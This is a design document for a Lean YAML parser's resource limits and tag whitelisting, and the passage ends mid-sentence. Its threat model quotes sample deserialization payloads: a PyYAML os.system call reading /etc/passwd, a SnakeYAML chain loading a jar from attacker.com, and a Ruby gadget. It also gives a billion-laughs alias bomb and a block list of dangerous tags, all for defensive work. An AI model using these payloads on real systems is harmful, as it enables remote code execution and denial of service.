# Parser Security: Limits and Tag Validation

## Overview

This document specifies security mechanisms to prevent **two critical vulnerability classes** in the lean4-yaml-verified parser:

1. **Denial-of-Service (DoS) attacks**: Billion laugh attacks, resource exhaustion, and cyclic structures
2. **Arbitrary code execution (ACE)**: Unsafe tags and directives that could execute code during deserialization

The YAML specification (1.2.2) is inherently unsafe when combined with language-specific tags (e.g., `!!python/object`, `!!ruby/object`). While Lean's purity prevents direct code execution, **tag validation is essential** for:
- **Preventing downstream attacks**: Unsafe tags passed to FFI or external systems
- **Schema enforcement**: Restricting documents to known-safe types
- **Defense in depth**: Rejecting malicious patterns before they reach application code

**Status**: **Implemented** in `L4YAML/Limits.lean` (v0.3.0). See `Tests/LimitTests.lean` for 43 passing tests across all limit categories.

## Threat Model

### 1. Arbitrary Code Execution via Unsafe Tags

**CRITICAL VULNERABILITY**: Language-specific tags can execute arbitrary code during parsing/deserialization.

#### PyYAML Example (Python)
```yaml
!!python/object/apply:os.system
args: ['cat /etc/passwd']
```

When loaded with `yaml.load()` (unsafe mode), this executes `os.system('cat /etc/passwd')`.

#### SnakeYAML Example (Java)
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/evil.jar"]
  ]]
]
```

Loads and executes remote code via Java's script engine.

#### Ruby Example
```yaml
--- !ruby/object:Gem::Installer
  i: x
--- !ruby/object:Gem::SpecFetcher
  i: y
```

Triggers deserialization gadgets in Ruby's object system.

**Current status in lean4-yaml-verified**:
- Tags are **parsed and preserved** in `Scalar.tag`, `YamlValue.sequence.tag`, `YamlValue.mapping.tag` (Types.lean:141-183)
- Directives are parsed: `%TAG !handle! prefix` defines custom tag shorthand (Types.lean:189-192)
- **No validation**: All tags accepted, passed through to application

**Attack surface**:
1. **Direct**: If parser exposes FFI hooks for tag handlers (not currently planned)
2. **Indirect**: Application code deserializes tagged values into unsafe types
3. **Downstream**: Tagged YAML passed to other systems (Python, Java, Ruby) that execute code

**Mitigation required**: Tag validation and whitelisting (see [Tag Security Limits](#4-tag-security-limits) below).

### 2. Billion Laugh Attack (Entity/Alias Expansion)

The classic XML entity expansion attack, adapted for YAML:

```yaml
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h]
```

Each level multiplies the result size by 8. Level 9 (`i`) expands to 8^9 = **134 million** copies of the string `"lol"`, consuming gigabytes of memory from a small input.

**Current vulnerability**: `YamlValue.resolveAliases` (Types.lean:369) recursively expands all aliases without limits. An attacker can craft payloads that exhaust memory or CPU during the `YamlDocument.compose` step (Types.lean:432).

### 3. Other DoS Vectors

- **Deeply nested structures**: Excessive nesting depth can cause stack overflow or quadratic traversal costs
- **Large scalar values**: Multi-gigabyte block scalars can exhaust memory
- **Large collections**: Sequences/mappings with millions of elements consume memory
- **Anchor table bloat**: Excessive anchors consume memory even before resolution
- **Cyclic aliases**: Malformed input with cycles (if not already caught by grammar)
- **Tag handle bombs**: Malicious `%TAG` directives with extremely long prefixes

## Proposed Limits

All limits are **configurable** via a `ParserLimits` structure, with conservative defaults suitable for untrusted input.

### Limit Categories

#### 1. Alias Expansion Limits

```lean
structure AliasLimits where
  /-- Maximum depth of alias resolution chains.
      Example: if a: &a *b, b: &b *c, c: "x", depth is 3.
      Prevents deeply nested alias chains.
      Default: 50 -/
  maxAliasDepth : Nat := 50

  /-- Maximum total number of alias resolution steps per document.
      Counts each `.alias` node substitution during `resolveAliases`.
      Prevents billion-laugh exponential expansion.
      Default: 10,000 -/
  maxAliasExpansions : Nat := 10_000

  /-- Maximum total size (in nodes) of the document after alias resolution.
      Prevents exponential memory consumption.
      Default: 100,000 nodes -/
  maxResolvedNodes : Nat := 100_000

  /-- Whether to detect and reject cyclic aliases (a: &a [*a]).
      Cyclic aliases violate YAML 1.2.2 §3.2.1 (acyclic graph requirement).
      Default: true -/
  rejectCycles : Bool := true
```

**Implementation strategy**:
- Add a stateful expansion tracker to `resolveAliases` that counts depth and total expansions
- Fail with `.error "alias expansion limit exceeded"` if thresholds are exceeded
- For cycle detection, maintain a `visited : Std.HashSet String` during traversal

#### 2. Structural Limits

```lean
structure StructuralLimits where
  /-- Maximum nesting depth of collections (sequences/mappings).
      Prevents stack overflow and quadratic traversal.
      Default: 100 -/
  maxDepth : Nat := 100

  /-- Maximum number of elements in a single sequence.
      Default: 100,000 -/
  maxSequenceLength : Nat := 100_000

  /-- Maximum number of key-value pairs in a single mapping.
      Default: 100,000 -/
  maxMappingSize : Nat := 100_000

  /-- Maximum length of a scalar value (in bytes).
      Default: 10 MB -/
  maxScalarBytes : Nat := 10_485_760

  /-- Maximum total number of nodes across all documents in a stream.
      Default: 1,000,000 -/
  maxTotalNodes : Nat := 1_000_000
```

**Implementation strategy**:
- Nesting depth: track current depth in parser state, increment/decrement on collection entry/exit
- Collection sizes: check `Array.size` after parsing sequences/mappings
- Scalar bytes: check `String.utf8ByteSize` after constructing block/flow scalars
- Total nodes: increment counter in `YamlStream` during parse, check at document boundaries

#### 3. Document-Level Limits

```lean
structure DocumentLimits where
  /-- Maximum number of documents in a stream.
      Default: 100 -/
  maxDocuments : Nat := 100

  /-- Maximum number of anchors per document.
      Default: 10,000 -/
  maxAnchors : Nat := 10_000

  /-- Maximum total input size (in bytes).
      Default: 100 MB -/
  maxInputBytes : Nat := 104_857_600
```

**Implementation strategy**:
- Document count: check `Array.size` in `parseStream` before adding each document
- Anchor count: check `AnchorMap.size` when inserting anchors
- Input size: validate `String.utf8ByteSize` at entry to `parseYaml`

#### 4. Tag Security Limits

**CRITICAL FOR SECURITY**: Control which YAML tags are accepted to prevent code execution attacks.

```lean
/-- Tag validation policy -/
inductive TagPolicy where
  /-- Accept all tags (UNSAFE - only for trusted input) -/
  | allowAll
  /-- Reject all explicit tags, only allow implicit typing (SAFE DEFAULT) -/
  | rejectAll
  /-- Whitelist: only accept tags in the allowed list -/
  | whitelist (allowed : List String)
  /-- Blacklist: reject tags in the forbidden list -/
  | blacklist (forbidden : List String)
  /-- Schema-based: only accept tags defined in YAML 1.2 Core Schema -/
  | coreSchemaOnly
  deriving Repr, BEq, Inhabited

structure TagLimits where
  /-- Tag validation policy.
      Default: coreSchemaOnly (!!str, !!int, !!float, !!bool, !!null, !!seq, !!map) -/
  policy : TagPolicy := .coreSchemaOnly

  /-- Whether to reject language-specific tags (!!python/*, !!java/*, !!ruby/*, etc.).
      Default: true -/
  rejectLanguageTags : Bool := true

  /-- Maximum length of a tag string (in bytes).
      Prevents tag handle bombs: `%TAG ! http://extremely-long-url.com/...`
      Default: 1024 bytes -/
  maxTagLength : Nat := 1_024

  /-- Maximum number of unique tags per document.
      Prevents tag table bloat attacks.
      Default: 100 -/
  maxUniqueTags : Nat := 100

  /-- Whether to reject custom tag handles (%TAG directives).
      Default: false (allow %TAG but validate expanded tags) -/
  rejectCustomHandles : Bool := false

  /-- Maximum length of tag handle prefix.
      Prevents malicious %TAG directives: `%TAG ! http://attacker.com/`
      Default: 256 bytes -/
  maxHandlePrefixLength : Nat := 256
```

**YAML 1.2 Core Schema Safe Tags** (whitelist when `policy = .coreSchemaOnly`):
```lean
def coreSchemaWhitelist : List String :=
  [ "tag:yaml.org,2002:str"      -- !!str: Unicode strings
  , "tag:yaml.org,2002:int"      -- !!int: Integers
  , "tag:yaml.org,2002:float"    -- !!float: Floating point
  , "tag:yaml.org,2002:bool"     -- !!bool: true/false
  , "tag:yaml.org,2002:null"     -- !!null: null/empty
  , "tag:yaml.org,2002:seq"      -- !!seq: Sequences (arrays)
  , "tag:yaml.org,2002:map"      -- !!map: Mappings (objects)
  , "tag:yaml.org,2002:binary"   -- !!binary: Base64-encoded binary
  , "tag:yaml.org,2002:timestamp" -- !!timestamp: ISO 8601 timestamps
  ]
```

**Dangerous Tag Patterns** (blacklist when `rejectLanguageTags = true`):
```lean
def dangerousTagPrefixes : List String :=
  [ "tag:yaml.org,2002:python/"  -- Python object deserialization
  , "!!python/"                  -- Python shorthand
  , "tag:yaml.org,2002:java/"    -- Java object deserialization
  , "!!java/"                    -- Java shorthand
  , "tag:yaml.org,2002:ruby/"    -- Ruby object deserialization
  , "!!ruby/"                    -- Ruby shorthand
  , "tag:yaml.org,2002:php/"     -- PHP object deserialization
  , "!!php/"                     -- PHP shorthand
  , "tag:yaml.org,2002:perl/"    -- Perl object deserialization
  , "!!perl/"                    -- Perl shorthand
  ]
```

**Real-world attack examples**:
- `!!python/object/apply:os.system` — Execute shell commands (PyYAML)
- `!!python/object/new:subprocess.Popen` — Spawn processes (PyYAML)
- `!!java.net.URLClassLoader` — Load remote classes (SnakeYAML)
- `!!javax.script.ScriptEngineManager` — Execute scripts (SnakeYAML)
- `!!ruby/object:Gem::Installer` — Ruby deserialization gadgets

**Implementation strategy**:
- Tag validation: Check all explicit tags during parse against policy
- Handle expansion: Validate `%TAG` directive prefixes before storing
- Tag length: Check `String.utf8ByteSize` when parsing tags
- Unique tag tracking: Maintain `HashSet String` of seen tags per document
- Pattern matching: For blacklist/whitelist, use `String.isPrefixOf` or regex

**Example usage**:

```lean
-- Safe configuration for untrusted input (web APIs, user uploads)
def strictTagPolicy : TagLimits := {
  policy := .coreSchemaOnly
  rejectLanguageTags := true
  maxTagLength := 256
  maxUniqueTags := 20
  rejectCustomHandles := true  -- Reject all %TAG directives
}

-- Moderate configuration (config files from known sources)
def permissiveTagPolicy : TagLimits := {
  policy := .whitelist [
    "tag:yaml.org,2002:str", "tag:yaml.org,2002:int",
    "tag:yaml.org,2002:float", "tag:yaml.org,2002:bool",
    "tag:yaml.org,2002:null", "tag:yaml.org,2002:seq",
    "tag:yaml.org,2002:map",
    "!myapp/user", "!myapp/config"  -- Application-specific tags
  ]
  rejectLanguageTags := true
  rejectCustomHandles := false  -- Allow %TAG for app-specific tags
}

-- Unsafe configuration (trusted internal use ONLY)
def unsafeTagPolicy : TagLimits := {
  policy := .allowAll
  rejectLanguageTags := false
}
```

### Combined Limits Structure

```lean
structure ParserLimits where
  alias : AliasLimits := {}
  structural : StructuralLimits := {}
  document : DocumentLimits := {}
  tag : TagLimits := {}

  /-- Whether to enforce limits at all. Setting to `false` disables all checks.
      Default: true -/
  enabled : Bool := true
  deriving Repr, BEq, Inhabited
```

### Predefined Configurations

```lean
namespace ParserLimits

/-- Conservative limits for untrusted input (web APIs, user uploads).
    10x stricter than defaults + strict tag validation. -/
def strict : ParserLimits := {
  alias := { maxAliasDepth := 20, maxAliasExpansions := 1_000, maxResolvedNodes := 10_000 }
  structural := { maxDepth := 50, maxSequenceLength := 10_000, maxMappingSize := 10_000,
                   maxScalarBytes := 1_048_576, maxTotalNodes := 100_000 }
  document := { maxDocuments := 10, maxAnchors := 1_000, maxInputBytes := 10_485_760 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 256, maxUniqueTags := 20, rejectCustomHandles := true }
}

/-- Permissive limits for trusted internal use (config files, test suites).
    100x more generous than defaults + relaxed tag validation. -/
def permissive : ParserLimits := {
  alias := { maxAliasDepth := 500, maxAliasExpansions := 1_000_000, maxResolvedNodes := 10_000_000 }
  structural := { maxDepth := 1000, maxSequenceLength := 10_000_000, maxMappingSize := 10_000_000,
                   maxScalarBytes := 1_073_741_824, maxTotalNodes := 100_000_000 }
  document := { maxDocuments := 10_000, maxAnchors := 1_000_000, maxInputBytes := 10_737_418_240 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 1024, maxUniqueTags := 1000, rejectCustomHandles := false }
}

/-- Unlimited mode for verification/testing. All checks disabled.
    WARNING: Do not use with untrusted input. ALLOWS ALL TAGS. -/
def unlimited : ParserLimits := { enabled := false }

/-- Safe mode: No resource limits, but strict tag validation.
    Use when performance is not a concern but security is. -/
def safeTagsOnly : ParserLimits := {
  enabled := true
  alias := { maxAliasDepth := 10_000, maxAliasExpansions := 10_000_000,
             maxResolvedNodes := 100_000_000, rejectCycles := true }
  structural := { maxDepth := 10_000, maxSequenceLength := 100_000_000,
                  maxMappingSize := 100_000_000, maxScalarBytes := 10_737_418_240,
                  maxTotalNodes := 1_000_000_000 }
  document := { maxDocuments := 100_000, maxAnchors := 10_000_000,
                maxInputBytes := 10_737_418_240 }
  tag := { policy := .coreSchemaOnly, rejectLanguageTags := true,
           maxTagLength := 256, maxUniqueTags := 100, rejectCustomHandles := true }
}

end ParserLimits
```

## Error Types

All limit violations are reported through structured inductive error types, enabling precise error handling and pattern matching.

### Error Hierarchy

```lean
/-! ## Alias Expansion Errors -/

/-- Errors that can occur during alias resolution -/
inductive AliasLimitError where
  /-- Cyclic alias reference detected: `a: &a [*a]` -/
  | cyclicAlias (name : String) (path : List String)
  /-- Alias resolution depth exceeded -/
  | depthExceeded (depth : Nat) (limit : Nat) (aliasName : String)
  /-- Total number of alias expansions exceeded -/
  | expansionCountExceeded (count : Nat) (limit : Nat)
  /-- Total number of nodes after resolution exceeded -/
  | nodeCountExceeded (count : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace AliasLimitError

def toString : AliasLimitError → String
  | cyclicAlias name path =>
    s!"Cyclic alias detected: '{name}' (resolution path: {" → ".intercalate path})"
  | depthExceeded depth limit aliasName =>
    s!"Alias resolution depth exceeded: {depth} > {limit} (resolving '{aliasName}')"
  | expansionCountExceeded count limit =>
    s!"Alias expansion count exceeded: {count} > {limit}"
  | nodeCountExceeded count limit =>
    s!"Resolved node count exceeded: {count} > {limit}"

instance : ToString AliasLimitError where
  toString := toString

end AliasLimitError

/-! ## Structural Limit Errors -/

/-- Errors for structural limits (depth, collection sizes, scalar sizes) -/
inductive StructuralLimitError where
  /-- Collection nesting depth exceeded -/
  | depthExceeded (depth : Nat) (limit : Nat) (path : YamlPath)
  /-- Sequence length exceeded -/
  | sequenceTooLarge (length : Nat) (limit : Nat) (path : YamlPath)
  /-- Mapping size exceeded -/
  | mappingTooLarge (size : Nat) (limit : Nat) (path : YamlPath)
  /-- Scalar value too large -/
  | scalarTooLarge (bytes : Nat) (limit : Nat) (path : YamlPath)
  /-- Total node count across all documents exceeded -/
  | totalNodesExceeded (count : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace StructuralLimitError

def toString : StructuralLimitError → String
  | depthExceeded depth limit path =>
    s!"Nesting depth exceeded: {depth} > {limit} at {pathToString path}"
  | sequenceTooLarge length limit path =>
    s!"Sequence too large: {length} elements > {limit} at {pathToString path}"
  | mappingTooLarge size limit path =>
    s!"Mapping too large: {size} pairs > {limit} at {pathToString path}"
  | scalarTooLarge bytes limit path =>
    s!"Scalar too large: {bytes} bytes > {limit} at {pathToString path}"
  | totalNodesExceeded count limit =>
    s!"Total node count exceeded: {count} > {limit}"
where
  pathToString : YamlPath → String
    | #[] => "root"
    | path => path.foldl (fun acc seg =>
        match seg with
        | .index i => s!"{acc}[{i}]"
        | .key k => s!"{acc}.{k}") ""

instance : ToString StructuralLimitError where
  toString := toString

end StructuralLimitError

/-! ## Document-Level Errors -/

/-- Errors for document-level limits (stream size, anchor count) -/
inductive DocumentLimitError where
  /-- Too many documents in stream -/
  | tooManyDocuments (count : Nat) (limit : Nat)
  /-- Too many anchors in a single document -/
  | tooManyAnchors (count : Nat) (limit : Nat) (docIndex : Nat)
  /-- Input size exceeded -/
  | inputTooLarge (bytes : Nat) (limit : Nat)
  deriving Repr, BEq, Inhabited

namespace DocumentLimitError

def toString : DocumentLimitError → String
  | tooManyDocuments count limit =>
    s!"Too many documents in stream: {count} > {limit}"
  | tooManyAnchors count limit docIndex =>
    s!"Too many anchors in document {docIndex}: {count} > {limit}"
  | inputTooLarge bytes limit =>
    s!"Input too large: {bytes} bytes > {limit}"

instance : ToString DocumentLimitError where
  toString := toString

end DocumentLimitError

/-! ## Tag Security Errors -/

/-- Errors for tag validation and security violations.
    These are CRITICAL security errors that may indicate attack attempts. -/
inductive TagSecurityError where
  /-- Forbidden tag detected (not in whitelist, or in blacklist) -/
  | forbiddenTag (tag : String) (reason : String)
  /-- Dangerous language-specific tag detected -/
  | dangerousLanguageTag (tag : String) (language : String)
  /-- Tag length exceeded -/
  | tagTooLong (bytes : Nat) (limit : Nat) (tag : String)
  /-- Too many unique tags in document -/
  | tooManyUniqueTags (count : Nat) (limit : Nat)
  /-- Custom tag handle rejected -/
  | customHandleRejected (handle : String) (prefix : String)
  /-- Tag handle prefix too long -/
  | handlePrefixTooLong (bytes : Nat) (limit : Nat) (prefix : String)
  /-- Tag not in Core Schema when coreSchemaOnly policy active -/
  | nonCoreSchemaTag (tag : String)
  deriving Repr, BEq, Inhabited

namespace TagSecurityError

def toString : TagSecurityError → String
  | forbiddenTag tag reason =>
    s!"SECURITY: Forbidden tag '{tag}': {reason}"
  | dangerousLanguageTag tag language =>
    s!"SECURITY: Dangerous {language} tag '{tag}' - potential code execution"
  | tagTooLong bytes limit tag =>
    s!"SECURITY: Tag too long: {bytes} bytes > {limit} (tag: {tag.take 50}...)"
  | tooManyUniqueTags count limit =>
    s!"SECURITY: Too many unique tags: {count} > {limit}"
  | customHandleRejected handle prefix =>
    s!"SECURITY: Custom tag handle rejected: {handle} → {prefix}"
  | handlePrefixTooLong bytes limit prefix =>
    s!"SECURITY: Tag handle prefix too long: {bytes} bytes > {limit} (prefix: {prefix.take 50}...)"
  | nonCoreSchemaTag tag =>
    s!"SECURITY: Non-Core-Schema tag '{tag}' (only !!str, !!int, !!float, !!bool, !!null, !!seq, !!map, !!binary, !!timestamp allowed)"

/-- Extract language name from dangerous tag for error reporting -/
def extractLanguage (tag : String) : String :=
  if tag.startsWith "tag:yaml.org,2002:python/" || tag.startsWith "!!python/" then "Python"
  else if tag.startsWith "tag:yaml.org,2002:java/" || tag.startsWith "!!java/" then "Java"
  else if tag.startsWith "tag:yaml.org,2002:ruby/" || tag.startsWith "!!ruby/" then "Ruby"
  else if tag.startsWith "tag:yaml.org,2002:php/" || tag.startsWith "!!php/" then "PHP"
  else if tag.startsWith "tag:yaml.org,2002:perl/" || tag.startsWith "!!perl/" then "Perl"
  else "unknown"

instance : ToString TagSecurityError where
  toString := toString

end TagSecurityError

/-! ## Composite Limit Error -/

/-- Top-level error type for all limit violations -/
inductive LimitError where
  | aliasLimit (err : AliasLimitError)
  | structuralLimit (err : StructuralLimitError)
  | documentLimit (err : DocumentLimitError)
  | tagSecurity (err : TagSecurityError)
  deriving Repr, BEq, Inhabited

namespace LimitError

def toString : LimitError → String
  | aliasLimit err => s!"Alias limit violation: {err}"
  | structuralLimit err => s!"Structural limit violation: {err}"
  | documentLimit err => s!"Document limit violation: {err}"
  | tagSecurity err => s!"{err}"  -- Already prefixed with "SECURITY:"

instance : ToString LimitError where
  toString := toString

/-- Convenience constructors -/
def cyclicAlias (name : String) (path : List String) : LimitError :=
  .aliasLimit (.cyclicAlias name path)

def aliasDepthExceeded (depth limit : Nat) (name : String) : LimitError :=
  .aliasLimit (.depthExceeded depth limit name)

def tooManyExpansions (count limit : Nat) : LimitError :=
  .aliasLimit (.expansionCountExceeded count limit)

def tooManyResolvedNodes (count limit : Nat) : LimitError :=
  .aliasLimit (.nodeCountExceeded count limit)

def nestingTooDeep (depth limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.depthExceeded depth limit path)

def sequenceTooLarge (length limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.sequenceTooLarge length limit path)

def mappingTooLarge (size limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.mappingTooLarge size limit path)

def scalarTooLarge (bytes limit : Nat) (path : YamlPath) : LimitError :=
  .structuralLimit (.scalarTooLarge bytes limit path)

def totalNodesExceeded (count limit : Nat) : LimitError :=
  .structuralLimit (.totalNodesExceeded count limit)

def tooManyDocuments (count limit : Nat) : LimitError :=
  .documentLimit (.tooManyDocuments count limit)

def tooManyAnchors (count limit : Nat) (docIndex : Nat) : LimitError :=
  .documentLimit (.tooManyAnchors count limit docIndex)

def inputTooLarge (bytes limit : Nat) : LimitError :=
  .documentLimit (.inputTooLarge bytes limit)

def forbiddenTag (tag : String) (reason : String) : LimitError :=
  .tagSecurity (.forbiddenTag tag reason)

def dangerousLanguageTag (tag : String) : LimitError :=
  .tagSecurity (.dangerousLanguageTag tag (TagSecurityError.extractLanguage tag))

def tagTooLong (bytes limit : Nat) (tag : String) : LimitError :=
  .tagSecurity (.tagTooLong bytes limit tag)

def tooManyUniqueTags (count limit : Nat) : LimitError :=
  .tagSecurity (.tooManyUniqueTags count limit)

def customHandleRejected (handle prefix : String) : LimitError :=
  .tagSecurity (.customHandleRejected handle prefix)

def handlePrefixTooLong (bytes limit : Nat) (prefix : String) : LimitError :=
  .tagSecurity (.handlePrefixTooLong bytes limit prefix)

def nonCoreSchemaTag (tag : String) : LimitError :=
  .tagSecurity (.nonCoreSchemaTag tag)

end LimitError
```

### Error Type Design Rationale

#### Why Structured Error Types?

Using inductive types instead of strings provides:

1. **Type-safe error handling**: Exhaustiveness checking ensures all error cases are handled
2. **Machine-readable errors**: Programmatic access to error details (counts, limits, paths)
3. **Precise error recovery**: Can distinguish transient vs. permanent failures
4. **Better error messages**: Structured data enables context-aware formatting
5. **Proof-friendliness**: Inductive types have strong elimination principles for verification

#### Error Hierarchy Design

The three-level hierarchy (`AliasLimitError` | `StructuralLimitError` | `DocumentLimitError` → `LimitError` → `ParseError`) enables:

- **Modular error handling**: Match only the error category you care about
- **Fine-grained recovery**: Different strategies for different limit types
- **Clear separation**: Syntax errors vs. resource limits are distinct at the type level
- **Future extensibility**: Can add new error categories without breaking existing code

Example: An API gateway might retry with relaxed limits on `DocumentLimitError.inputTooLarge` but immediately reject on `AliasLimitError.cyclicAlias` (malicious input).

#### Error Context Fields

Each error variant includes contextual information:

- **Counts and limits**: Actual value that exceeded the limit (enables adaptive strategies)
- **Paths**: Where in the document structure the violation occurred (debugging)
- **Names**: Specific aliases or keys involved (security auditing)
- **Indices**: Document number in multi-document streams (batch processing)

This metadata supports:
- **Detailed logging**: Security teams can audit DoS attempts
- **Progressive enhancement**: "Document OK at level 5, failed at level 50" suggests legitimate complexity
- **User guidance**: "Reduce nesting depth at path `.servers[0].config`" is actionable

#### Alternatives Considered

**Option 1**: Single flat `LimitError` enum with all 12 variants
- ❌ Harder to match on error categories
- ❌ No semantic grouping of related errors

**Option 2**: Generic `LimitExceeded { what : String, actual : Nat, limit : Nat }`
- ❌ Loses type safety (string matching on `what`)
- ❌ Can't enforce error-specific fields (e.g., path only for structural errors)

**Option 3**: Exceptions with error codes (integer/string tags)
- ❌ Not idiomatic in Lean (functional error handling via `Except`)
- ❌ Breaks verification (exceptions bypass type checking)

**Chosen approach** (structured inductives) best balances ergonomics, type safety, and proof tractability.

## API Changes

### Current API

```lean
-- Types.lean:432
def YamlDocument.compose (doc : YamlDocument) : YamlDocument :=
  { doc with
    value := (doc.value.resolveAliases doc.anchors).stripAnchors
    anchors := #[] }

-- TokenParser.lean (current)
def parseYaml (input : String) : Except String (Array YamlDocument) := do
  let docs ← parseYamlRaw input
  return docs.map (·.compose)
```

### Proposed API

```lean
-- Types.lean: Updated compose signature
def YamlDocument.compose (doc : YamlDocument) (limits : ParserLimits := {})
    (docIndex : Nat := 0)  -- For error reporting
    : Except LimitError YamlDocument := do
  -- Check document-level limits first
  if limits.enabled && doc.anchors.size > limits.document.maxAnchors then
    throw <| .tooManyAnchors doc.anchors.size limits.document.maxAnchors docIndex

  -- Resolve aliases with expansion tracking (returns AliasLimitError)
  let resolved ← doc.value.resolveAliasesLimitedLifted doc.anchors limits.alias

  return { doc with value := resolved.stripAnchors, anchors := #[] }

-- TokenParser.lean: Updated parseYaml signature
def parseYaml (input : String) (limits : ParserLimits := {})
    : Except LimitError (Array YamlDocument) := do
  -- Check input size limit
  if limits.enabled && input.utf8ByteSize > limits.document.maxInputBytes then
    throw <| .inputTooLarge input.utf8ByteSize limits.document.maxInputBytes

  let docs ← parseYamlRaw input limits
  docs.mapIdxM (fun idx doc => doc.compose limits idx)
```

**Key changes**:
- `compose` now returns `Except LimitError YamlDocument` instead of `YamlDocument`
- All error strings replaced with typed constructors from `LimitError` namespace
- Parser callers can pattern match on specific error types for precise handling
- Added `docIndex` parameter to `compose` for better error context

### Parser Error Integration

The parser needs to track both parse errors and limit errors. We introduce a unified error type:

```lean
-- TokenParser.lean: Unified parser error type
inductive ParseError where
  | syntaxError (msg : String) (pos : YamlPos)
  | limitViolation (err : LimitError)
  deriving Repr, BEq

namespace ParseError

def toString : ParseError → String
  | syntaxError msg pos => s!"Syntax error at line {pos.line}, col {pos.col}: {msg}"
  | limitViolation err => s!"Limit violation: {err}"

instance : ToString ParseError where
  toString := toString

end ParseError

-- Updated parseYamlRaw to track structural limits during parsing
def parseYamlRaw (input : String) (limits : ParserLimits := {})
    : Except ParseError (Array YamlDocument) := do
  -- Check input size limit upfront
  if limits.enabled && input.utf8ByteSize > limits.document.maxInputBytes then
    throw <| .limitViolation (.inputTooLarge input.utf8ByteSize limits.document.maxInputBytes)

  -- Scan tokens
  let tokens ← Scanner.scanFiltered input
    |>.mapError (fun e => .syntaxError e.toString ⟨0, 0, 0⟩)

  -- Parse with structural limit tracking
  parseStream tokens limits

where
  -- parseStream now tracks limits during parsing
  def parseStream (tokens : Array (Positioned YamlToken)) (limits : ParserLimits)
      : Except ParseError (Array YamlDocument) := do
    let mut docs := #[]
    let mut state := ParserState.empty limits

    for tok in tokens do
      -- ... parsing logic with limit checks ...
      if limits.enabled && docs.size ≥ limits.document.maxDocuments then
        throw <| .limitViolation (.tooManyDocuments (docs.size + 1) limits.document.maxDocuments)

      -- Track nesting depth, node count, etc. in state
      -- Throw .limitViolation errors when limits exceeded

    return docs

-- Final parseYaml that composes parseYamlRaw + alias resolution
def parseYaml (input : String) (limits : ParserLimits := {})
    : Except ParseError (Array YamlDocument) := do
  let docs ← parseYamlRaw input limits

  -- Map over documents with index for error context
  docs.mapIdxM fun idx doc => do
    doc.compose limits idx
      |>.mapError ParseError.limitViolation
```

This design allows distinguishing between:
- **Syntax errors**: Malformed YAML (wrong indentation, invalid escape sequences, etc.)
- **Limit violations**: Valid YAML that exceeds resource constraints

### Limited Alias Resolution

```lean
-- Types.lean: resolveAliasesLimited function
def YamlValue.resolveAliasesLimited (v : YamlValue)
    (anchors : Array (String × YamlValue))
    (limits : AliasLimits := {})
    : Except AliasLimitError YamlValue := do
  let tracker := AliasTracker.empty limits
  resolveImpl v anchors tracker

where
  structure AliasTracker where
    limits : AliasLimits
    depth : Nat := 0
    totalExpansions : Nat := 0
    totalNodes : Nat := 0
    visited : Std.HashSet String := {}
    resolutionPath : List String := []  -- Track path for cycle detection

  -- Increment counters and check limits
  def checkLimits (t : AliasTracker) (name : String) : Except AliasLimitError AliasTracker := do
    -- Check for cycles first
    if t.limits.rejectCycles && t.visited.contains name then
      throw <| .cyclicAlias name (name :: t.resolutionPath)

    -- Check depth limit
    if t.depth > t.limits.maxAliasDepth then
      throw <| .depthExceeded t.depth t.limits.maxAliasDepth name

    -- Check expansion count limit
    if t.totalExpansions > t.limits.maxAliasExpansions then
      throw <| .expansionCountExceeded t.totalExpansions t.limits.maxAliasExpansions

    -- Check resolved node count limit
    if t.totalNodes > t.limits.maxResolvedNodes then
      throw <| .nodeCountExceeded t.totalNodes t.limits.maxResolvedNodes

    return { t with
             visited := t.visited.insert name,
             resolutionPath := name :: t.resolutionPath,
             totalExpansions := t.totalExpansions + 1 }

  -- Helper: increment node counter
  def incNode (t : AliasTracker) : AliasTracker :=
    { t with totalNodes := t.totalNodes + 1 }

  -- Helper: increment/decrement depth
  def incDepth (t : AliasTracker) : AliasTracker :=
    { t with depth := t.depth + 1 }

  def decDepth (t : AliasTracker) : AliasTracker :=
    { t with depth := t.depth - 1 }

  -- Recursive resolution with tracking
  -- Returns (resolved value, updated tracker)
  def resolveImpl : YamlValue → Array (String × YamlValue) → AliasTracker
      → Except AliasLimitError (YamlValue × AliasTracker)
    | .scalar s, _, t =>
      return (.scalar s, t.incNode)

    | .sequence style items tag anchor, anchors, t => do
      let t := t.incDepth.incNode
      let (items', t) ← items.foldlM (fun (acc, t) item => do
        let (item', t) ← resolveImpl item anchors t
        return (acc.push item', t)) (#[], t)
      return (.sequence style items' tag anchor, t.decDepth)

    | .mapping style pairs tag anchor, anchors, t => do
      let t := t.incDepth.incNode
      let (pairs', t) ← pairs.foldlM (fun (acc, t) (k, v) => do
        let (k', t) ← resolveImpl k anchors t
        let (v', t) ← resolveImpl v anchors t
        return (acc.push (k', v'), t)) (#[], t)
      return (.mapping style pairs' tag anchor, t.decDepth)

    | .alias name, anchors, t => do
      let t ← checkLimits t name
      match anchors.findSome? (fun (n, val) => if n == name then some val else none) with
      | some val =>
        -- Found anchor, recursively resolve it with increased depth
        resolveImpl val anchors { t with depth := t.depth + 1 }
      | none =>
        -- Unresolved alias: leave as-is (YAML 1.2.2 allows this)
        return (.alias name, t)

-- Lift to LimitError for use in compose
def YamlValue.resolveAliasesLimitedLifted (v : YamlValue)
    (anchors : Array (String × YamlValue))
    (limits : AliasLimits := {})
    : Except LimitError YamlValue :=
  v.resolveAliasesLimited anchors limits
    |>.mapError LimitError.aliasLimit
    |>.map Prod.fst
```

**Note**: The above is pseudocode showing the control flow. Actual implementation will need to:
